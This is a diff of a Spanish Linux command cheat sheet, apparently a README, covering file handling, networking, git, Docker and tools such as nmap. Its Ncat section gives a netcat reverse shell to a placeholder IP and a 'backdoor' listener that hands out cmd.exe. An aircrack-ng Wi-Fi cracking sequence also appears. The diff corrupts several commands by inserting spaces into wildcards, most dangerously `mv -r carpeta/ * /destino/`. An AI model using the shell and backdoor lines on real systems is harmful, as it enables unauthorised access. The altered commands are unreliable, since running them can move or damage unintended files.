@@ -2,11 +2,15 @@
 
 Privilegios absolutos (root)
 
-```su```
+```
+su
+```
 
 Si el usuario pertenece al grupo de administradores
 
-```sudo -i``` 
+```
+sudo -i
+``` 
 
 Actualizar 
 
@@ -18,19 +22,27 @@ Actualizar
  ```
 o
 
-``` apt update -y && apt upgrade -y && apt autoremove -y```
+```
+ apt update -y && apt upgrade -y && apt autoremove -y
+ ```
 
 Crear usuario
 
-```sudo useradd nombreusuario```
+```
+sudo useradd nombreusuario
+```
 
 Para agregar usuarios a grupos, por ejemplo, grupo sudo
 
-```sudo usermod -aG sudo nombreusuario```
+```
+sudo usermod -aG sudo nombreusuario
+```
 
 Eliminar usuario
 
-```sudo userdel nombreusuario```
+```
+sudo userdel nombreusuario
+```
 
 Ver usuarios y detalles del host
 
@@ -41,29 +53,41 @@ hostnamectl
 
 Para cambiar la contraseña utilizamos:
 
-```passwd```
+```
+passwd
+```
 
 Para el root, utilizamos:
 
-```sudo passwd root```
+```
+sudo passwd root
+```
 
 Para ver los grupos a los que pertenece el usuario
 
-```group nombreusuario``` 
+```
+group nombreusuario
+``` 
 
 Para saber el nombre del host
 
-```hostname```
+```
+hostname
+```
  
 Para cambiar el nombre
 
-```hostnamectl set-hostname nuevonombre```
+```
+hostnamectl set-hostname nuevonombre
+```
 
 Instalar todo tipo de programas en Linux, por ejemplo, htop: 
 
-```sudo apt install htop -y```
+```
+sudo apt install htop -y
+```
 
-Instala programas con snap (```apt install snapd```), por ejemplo, VScode, Android Studio y VLC:
+Instala programas con snap (``apt install snapd``), por ejemplo, VScode, Android Studio y VLC:
 
 ```
 snap install code --classic
@@ -73,7 +97,9 @@ snap install vlc --classic
 
 Crear un USB bootable con cualquier imagen de Linux.  
 
- ```sudo dd bs=4M if=***.iso of=/dev/sdb status=progress```
+```
+ sudo dd bs=4M if=arch.iso of=/dev/sdb status=progress
+```
 
 Crear y navegar a las carpetas
 
@@ -84,43 +110,63 @@ cd /carpeta
 
 Regresar al directorio anterior
 
- ```cd ..```
+```
+cd ..
+```
 
 Saber el directorio en el que estamos
 
-```pwd```
+```
+pwd
+```
 
 Limpiar la pantalla en la terminal
 
-``` clear # o Crtl-L```
+```
+ clear # o Crtl-L
+```
 
 Ver la historia del terminal
 
-```history```
+```
+history
+```
 
 Mostrar toda la estructura de los ficheros:
 
-```tree```
+```
+tree
+```
 
 Montar USB externo
 
-```sudo mount -rw /dev/sd* /carpeta```
+```
+sudo mount -rw /dev/sd /carpeta
+```
 
 Crear un archivo vacio:
 
- ```touch nombrearchivo```
+```
+ touch nombrearchivo
+```
  
 Crear un archivo con un texto corto:
 
-``` echo "Texto corto" > nombrearchivo ```
+```
+ echo "Texto corto" > nombrearchivo
+```
 
 Si utilizamos >> agregamos el texto sin reemplazar el archivo. 
 
-``` echo "Agregamos texto nuevo" >> nombrearchivo```
+```
+ echo "Agregamos texto nuevo" >> nombrearchivo
+ ```
 
 Si queremos aplicar un comando a un archivo, por ejemplo, un sript mysql, usamos "<" 
 
-```mariadb --user=root --password -s < mariadb.sql```
+```
+mariadb --user=root --password -s < mariadb.sql
+```
 
 Para echar un ojo a un archivo corto:
 
@@ -132,21 +178,29 @@ Para echar un ojo a un archivo corto:
  
 Con el editor nano podemos ver y editar archivos más grandes:
 
- ```nano nombrearchivo```
+ ```
+ nano nombrearchivo
+ ```
  
 Utilizando Crlt-x guardamos los cambios. 
 
 Copiar archivos de un sitio a otro:
 
- ```cp carpeta/archivo carpeta/```
+ ```
+ cp carpeta/archivo carpeta/
+ ```
  
 Crear copia con nuevo nombre
 
-``` cp archivo nuevoarchivo ```
+```
+ cp archivo nuevoarchivo
+```
 
 Renombrar archivos (no guarda la copia anterior)
 
-``` mv archivo nuevoarchivo```
+```
+ mv archivo nuevoarchivo
+ ```
 
 Listar archivos 
 
@@ -156,11 +210,15 @@ ls -l
 ```
 Para mover archivos seguimos el mismo razonamiento que al copiar. Mientras que si es una carpeta debemos agregar -r.
 
-``` mv -r carpeta/ /carpeta/destino ```
+``` 
+mv -r carpeta/ /carpeta/destino
+ ```
 
 Mover todos los archivos de una carpeta a otra
 
-```mv -r carpeta/* /destino/```
+```
+mv -r carpeta/ * /destino/
+```
 
 Para eliminar archivos y carpetas:
  ```
@@ -168,23 +226,37 @@ Para eliminar archivos y carpetas:
  rm -r /carpeta
  
 ```
-Cuidado, ```#sudo rm -r /*```  destroza nuestro sistema, elimina todo
+Cuidado, ``#sudo rm -r /*``  destroza nuestro sistema, elimina todo
 
-Crear links a archivos es sencillo, por ejemplo, al "```archivo1```":
+Crear links a archivos es sencillo, por ejemplo, al "``archivo1``":
 
-```link archivo1 archivo2```
+```
+link archivo1 archivo2
+```
 
 Opcionalemente podemos utilizar:
 
-```ln archivo1 archivo2```
+```
+ln archivo1 archivo2
+```
 
 Para crear links a directorios o entre particiones
 
-```ln -s /dir1 archivos```
+```
+ln -s /dir1 archivos
+```
+
+Este comando es un combo, ya que permite saber que binarios tenemos instalados:
+
+```
+ls /bin/ && ls /usr/bin
+```
 
 Para saber dispositivos conectados a los puertos USB:
 
-```lsusb```
+```
+lsusb
+```
  
 Ver las conexiones en los sockets de nuestro equipo
 
@@ -205,11 +277,15 @@ IP local y Wifi.
 
 IP pública
 
-```curl https://ipinfo.io/ip```
+```
+curl https://ipinfo.io/ip
+```
 
 Ruta
 
-```route -n```
+```
+route -n
+```
  
 
 Enviar peticiones a servidores online o en red local
@@ -225,15 +301,12 @@ uname -r
 uptime -p
 ```
 
-Almacenamiento de los discos
-
- ``df``
+Almacenamiento de los discos ``df``
  
 Si queremos saber donde está un dispositivo USB, disco duro y sus particiones:
 
- ```sudo fdisk -l```
-
-
+ ```
+ sudo fdisk -l
  ```
 Los procesos del sistema pueden mostrarse con:
 
@@ -246,26 +319,34 @@ El signo | nos permite concatenar comandos (pipes).
 
 Imprimir todos los procesos en un momento determinado
 
-```ps -ef```
+```
+ps -ef
+```
 
 Detalles del Hardware y bios del sistema
 
-```dmidecode```
+```
+dmidecode
+```
 
-Con neofetch podemos ver detalles de nuestro sistema de manera divertida (```apt install neofetch```)
+Con neofetch podemos ver detalles de nuestro sistema de manera divertida (``apt install neofetch``)
 
- ```neofetch```
+ ```
+ neofetch
+ ```
  
 Descomprimir archivos
  
  ```
- unzip *.zip
+ unzip * .zip
  gunzip example.txt.gz
  ```
 
-Instalación de aplicaciones .deb. Tambien es posible usar ```gdebi```. 
+Instalación de aplicaciones .deb. Tambien es posible usar ``gdebi``. 
 
-``` dpkg -i archivo.deb && apt install -f```
+```
+ dpkg -i archivo.deb && apt install -f
+```
 
 Los siguientes comandos utilizan systemctl para controlar servicios del sistema.
 ```
@@ -276,7 +357,9 @@ Los siguientes comandos utilizan systemctl para controlar servicios del sistema.
 ```
 Reiniciar Wifi 
 
-```service network-manager restart```
+```
+service network-manager restart
+```
 
 Detener proceso 
 
@@ -290,17 +373,21 @@ Características del sistema
 ```
  lshw
  lscpu
- ```
+```
  
 Browser en terminal
 
-``` elinks https://medium.com/learn-love-code/how-to-set-up-your-professional-data-science-environment-6df74eb06aa4 ```
+```
+elinks https://medium.com/learn-love-code/how-to-set-up-your-professional-data-science-environment-6df74eb06aa4
+```
 
 ## Comandos comunes que siempre olvido.
 
 Ver lista de fuentes 
 
-```nano /etc/apt/sources.list```
+```
+nano /etc/apt/sources.list
+```
 
 Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, 
 ```
@@ -311,11 +398,15 @@ Controlar los permisos para la accesibilidad de los archivos y carpetas de nuest
  sudo chmod 700 nombrearchivo
 ```
 Acceso a carpeta para todos los usuarios:
-```chmod ugo+rwx nombrecarpeta```
+```
+chmod ugo+rwx nombrecarpeta
+```
 
 Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY"
 
-```sudo chown -hR root /u```    
+```
+sudo chown -hR root /u
+```    
 
 ## Encontrar palabras con ``grep`` o ``egrep``
 ```
@@ -340,29 +431,41 @@ echo "field1 field2 field3 field4" | grep -oP '(?<=field2 )\w+'
  
  IP del proveedor de Internet
  
- ``` grep nameserver  /etc/resolv.conf | awk '{print $2}'```
+ ``` 
+ grep nameserver  /etc/resolv.conf | awk '{print $2}'
+ ```
  
  IP del servidor local
  
- ```ip route show |grep default | awk '{print $3}' | cut -d$'\n' -f1```
+ ```
+ ip route show |grep default | awk '{print $3}' | cut -d$'\n' -f1
+ ```
  
  IP local del dispositivo
  
- ```ip address show $interface | grep "inet " | awk '{print $2}'```
+ ```
+ ip address show $interface | grep "inet " | awk '{print $2}'
+ ```
 
 ## Manejo de archivos y Data Mining
 
 Para listar los archivos que tengan un patrón, por ejemplo, que terminen en .iso. 
 
- ```ls | grep *.iso```
+ ```
+ ls | grep * .iso
+ ```
  
 Para saber el número de archivos en una carpeta:
 
-``` ls | wc -l```
+``` 
+ls | wc -l
+```
 
 Conocer la cantidad de filas en un archivo
 
-```wc -l archivo```
+```
+wc -l archivo
+```
 
 
 Para acceder a las 10 primeras y últimas filas:
@@ -374,23 +477,33 @@ Para acceder a las 10 primeras y últimas filas:
 
 Si el archivo es demasiado grande, podemos separarlo en varias partes, por ejemplo, cinco:
 
-```split -n l/5 archivo x```
+```
+split -n l/5 archivo x
+```
 
 Para seleccionar la quinta columna, utilizamos:
 
-```awk '{print $5}' archivo```
+```
+awk '{print $5}' archivo
+```
 
 Separar columnas en función de un caracter, por ejemplo, dos puntos (:)
 
- ```cut -d ':' -f1 archivo```
+ ```
+ cut -d ':' -f1 archivo
+ ```
 
 Obtener la primera fila de datos
 
-```sed 1d archivo```
+```
+sed 1d archivo
+```
 
 Eliminar la última línea o fila de datos
 
-```sed -i '$ d' archivo```
+```
+sed -i '$ d' archivo
+```
 
 
 Cambiar el orden de columnas
@@ -402,7 +515,9 @@ ps -ef | awk -F " " '{print $2}'
 ```
 
 Cortar una sección intermedia de filas
-```sed -n '250, 260p' archivo1.txt > archivo2.txt```
+```
+sed -n '250, 260p' archivo1.txt > archivo2.txt
+```
 
 Crear un secuencia ``seq 1 10``
 
@@ -419,25 +534,35 @@ locate -i archivo
 
 Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para Debian 10 y Ubuntu 19. 
 
- ```wget https://download1.rstudio.org/desktop/bionic/amd64/rstudio-1.2.5001-amd64.deb```
+```
+wget https://download1.rstudio.org/desktop/bionic/amd64/rstudio-1.2.5001-amd64.deb
+```
 
 Para descargar archivos de un servidor o website. 
 
-```wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np www.programandoconro.wordpress.com```
+```
+wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np www.programandoconro.wordpress.com
+```
 
 Descargar el index.html y los links asociados al website.
 
-```wget -rpk www.programandoconro.wordpress.com```
+```
+wget -rpk www.programandoconro.wordpress.com
+```
 
 ### Git
 
 Para descargar un repositorios Git:
 
- ```git clone https://github.com/progamandoconro/My-Lynux-Locker```
+ ```
+ git clone https://github.com/progamandoconro/My-Lynux-Locker
+ ```
  
 Para actualizar el repositorio local a partir de GitHub:
 
- ```git pull origin master```
+ ```
+ git pull origin master
+ ```
  
 Los commits y los push también pueden realizarse de esta manera o directamente en GitHub. 
 
@@ -465,7 +590,7 @@ git help -g
 
 Tutorial de git
 
-```git help tutorial```
+``git help tutorial``
 
 ### Docker (o Podman)
 
@@ -508,10 +633,10 @@ docker-compose stop
 
 Para navegar de manera anónima.  Simplemente descárgalo de https://www.torproject.org y: 
 
- ```
+```
  tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz 
  ./tor-browser_en-US/Browser/start-tor-browser &
- ```
+```
 
  ### Anaconda
  ```
@@ -540,12 +665,14 @@ youtube-dl -F $url
 ```
 ### Cambiar formato .avi a .mp4
 
-```ffmpeg -i input.avi -strict -2 output.mp4```
+```
+ffmpeg -i input.avi -strict -2 output.mp4
+```
 
 ### Crear gifs animados (``ImageMagick``):
 
 ```
-convert -delay 10 -loop 0 *.png mygif.gif
+convert -delay 10 -loop 0 * .png mygif.gif
 ```
 
 ### VLC para controlar la música desde la línea de comandos. 
@@ -563,20 +690,22 @@ convert -delay 10 -loop 0 *.png mygif.gif
  bastet
  moon-buggy
  figlet HOLA AMIGO 
+ 
  ``` 
  El próximo comando te hará sentir en la matrix. (apt install cmatrix)
  
- ```cmatrix```
+ ```
+ cmatrix 
+ telnet towel.blinkenlights.nl
+ ``` 
  
- ```telnet towel.blinkenlights.nl``` 
+Factores en la terminal ``factor 12``
  
-Factores en la terminal ```factor 12```
- 
-Voltea la palabra que introduzcas ```rev``` agrega 123, por ejemplo. 
+Voltea la palabra que introduzcas ``rev`` agrega 123, por ejemplo. 
 
 Repite un mensaje ``yes Viva Linux!!``
  
-Provocar sonidos en el computador (apt install beep / yum install beep) ```beep -f 4000 -D 500 -l 100 -r 100``
+Provocar sonidos en el computador (apt install beep / yum install beep) ``beep -f 4000 -D 500 -l 100 -r 100``
 
 También se puede hacer un banner, sencillamente: ``banner hola``
 
@@ -592,8 +721,9 @@ apt install ... # dnf install ...
 
 Buscar paquetes que contienen algun comando que requerimos
 
-```apt search comando``` #(o ```yum search comando```)
-
+```
+apt search comando #(o ``yum search comando``)
+```
 Para ejecutar scripts al iniciar el sistema
 ```
 cd ~
@@ -603,7 +733,9 @@ sudo nano .bashrc
 ```
 Listar las aplicaciones desktop
 
-```ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -```
+```
+ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
+```
 
 Tiempo de procesos
 
@@ -613,24 +745,32 @@ time bash myUpdate.sh
 ```
  Esperar 10 segundos. 
 
-```sleep 10```
+```
+sleep 10
+```
 
  Programar tareas
 
 ```
 rm -f /var/run/crond.pid #delete pid
-cron 00 00 *** myUpdate.sh #todos los dias a las 12
-````
+cron 00 00 * * * myUpdate.sh #todos los dias a las 12
+```
 Cambiar el tamaño de las fuente en terminal. 
-```dpkg-reconfigure console-setup```
+```
+dpkg-reconfigure console-setup
+```
 
 Kill procesos en un socket determinado
 
-```sudo lsof -t -i tcp:8000 | xargs kill -9```
+```
+sudo lsof -t -i tcp:8000 | xargs kill -9
+```
 
 Asignar "alias" a comandos, por ejemplo:
 
-```alias python=python3```
+```
+alias python=python3
+```
 
 Formatear USB:
 
@@ -650,7 +790,7 @@ echo 8 > /sys/class/backlight/intel_backlight/brightness
 
 ### Nmap 
 
-(```apt install nmap```)
+(``apt install nmap``)
 
 ```
 nmap localhost
@@ -669,11 +809,15 @@ nmap -Pn **PublicIP**/24
 
 Conectar
 
- ``` ssh usuario@servidor.local```
+ ```
+ssh usuario@servidor.local
+```
  
  o 
  
- ```ssh usuario@IP```
+ ```
+ ssh usuario@IP
+ ```
  
  Conectar SSH sin password
  
@@ -684,7 +828,9 @@ Conectar
 
 Compartir archivos
 
-```scp nombrearchivo mi@servidor.local:~```
+```
+scp nombrearchivo mi@servidor.local:~
+```
 
 Bloquear IPs que intenten conectar sin permiso
 
@@ -702,7 +848,9 @@ export DISPLAY=:1 # en el servidor remoto
  
  El cliente con Firewall se conecta a la computadora del desarrollador (dev), y envía su shell de manera reversa (``-R--``), creando un túnel.
  
- ``ssh -R 19999:localhost:22 dev@publicIP``
+ ```
+ssh -R 19999:localhost:22 dev@publicIP
+```
  
  El desarrollador escucha en el puerto 19999 y accede a la computadora del cliente (cli), gracias al túnel abierto.
  
@@ -714,13 +862,15 @@ export DISPLAY=:1 # en el servidor remoto
 
 ### Compartir la terminal en el browser
 
-(```apt install tmate``` / ```yum install tmate```)
+(``apt install tmate`` / ``yum install tmate``)
 
-```tmate```
+```
+tmate
+```
  
-### Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (```apt install aircrack-ng```)
+### Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (``apt install aircrack-ng``)
  
- ```
+```
 ifconfig wlan1 down
 iwconfig wlan1 mode monitor
 iwconfig
@@ -728,9 +878,12 @@ airdump-ng
 airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX:XX -w output wlan1
 aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt 
 ```
-Escaneo de Redes Wifi Disponibles
+Escaneo de Redes Wifi Disponibles 
+```
 
-``` sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"```
+sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"
+
+```
 
 ### Ncat:
 
@@ -738,21 +891,29 @@ Reverse Shell:
 
 Desarrollador escucha en puerto 4444
 
-``` nc -lvp 4444 ```
+```
+ nc -lvp 4444 
+```
 
 Cliente envía su Shell a la IP del desarrollador
 
-```nc **IP** 4444 -e /bin/sh```
+```
+nc **IP** 4444 -e /bin/sh
+```
 
 Backdoor
 
 Ejecutar en el servidor remoto
 
-```nc -L -p 3001 -d -e cmd.exe```
+```
+nc -L -p 3001 -d -e cmd.exe
+```
 
 Servidor web inseguro
 
-```while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done```
+```
+while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done
+```
 
 Chat
 ```
@@ -804,11 +965,15 @@ mi-super-comando
 
 Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:
 
- ```dmesg | grep ttyUSB```
+ ```
+ dmesg | grep ttyUSB
+ ```
  
 Podemos usar rshell y repl para acceder al dispositivo
 
- ``` rshell -p /dev/ttyUSB* && repl```
+ ```
+ rshell -p /dev/ttyUSB && repl
+ ```
  
 Para interactuar con el dispositivo, podemos usar:
 
@@ -820,16 +985,27 @@ Para interactuar con el dispositivo, podemos usar:
 ```
 Temperatura CPU Raspberry Pi
 
-```/opt/vc/bin/vcgencmd measure_temp```
+```
+/opt/vc/bin/vcgencmd measure_temp
+```
  
 Controla el audio:
 
-```amixer scontrols```
+```
+amixer scontrols
+```
 
 Busca el dispositivo y ajustar el volumen 
 
-```amixer sset 'PCM' 100%```
+```
+amixer sset 'PCM' 100%
+```
 
+Cambiar el banner cuando accedemos al shell del servidor.
+
+```
+vim /etc/motd
+```
 ## Programación (Bash Script)
 
 ### For 
